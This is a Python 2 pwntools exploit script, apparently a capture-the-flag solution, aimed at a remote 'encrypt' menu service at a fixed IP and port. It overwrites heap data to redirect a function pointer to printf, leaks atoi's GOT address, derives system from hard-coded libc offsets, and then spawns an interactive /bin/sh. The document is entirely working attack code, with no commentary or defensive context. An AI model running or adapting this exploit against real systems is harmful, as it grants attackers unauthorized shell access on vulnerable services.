from pwn import *
def add(s):
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(s)
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil('Exit.')
def edit(id,buf):
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(id))
    p.recvuntil(':')
    p.sendline(buf)
    p.recvuntil('Exit.')
def encrypt(id):
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(id))
    p.recvuntil('...')
#p=process('./encrypt')
p=remote('101.200.187.112','9005')
p.recvuntil('Exit.')
atoigot=0x602070
printf=0x400750
for x in range(3):
    add('junk')
#edit message
offset_atoi = 0x0000000000039f50
offset_system = 0x0000000000046640
edit(1,'%s\x00'+(0x50-3)*'\x00'+p64(atoigot))
edit(2,0x60*'a'+p64(printf))
encrypt(1)
d=p.recvuntil('\x7f')[1:].ljust(8,'\x00')
atoi=u64(d)
print '[+] atoi:'+hex(atoi)
system=atoi-offset_atoi+offset_system
p.recvuntil('Exit.')
edit(1,0x60*'a'+p64(system))
edit(0,'/bin/sh\x00')
encrypt(0)
p.interactive()
